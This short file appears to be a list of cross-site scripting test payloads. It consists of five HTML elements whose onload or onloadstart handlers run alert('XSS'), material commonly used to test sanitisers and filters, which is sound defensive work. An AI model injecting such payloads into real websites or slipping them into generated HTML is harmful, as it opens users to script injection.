<img src="https://example.com/image.png" onload="alert('XSS')">

<iframe src="https://example.com/embed.html" onload="alert('XSS')"></iframe>

<object data="https://example.com/object.swf" onload="alert('XSS')"></object>

<embed src="https://example.com/plugin.swf" onload="alert('XSS')">

<video src="https://example.com/video.mp4" onloadstart="alert('XSS')"></video>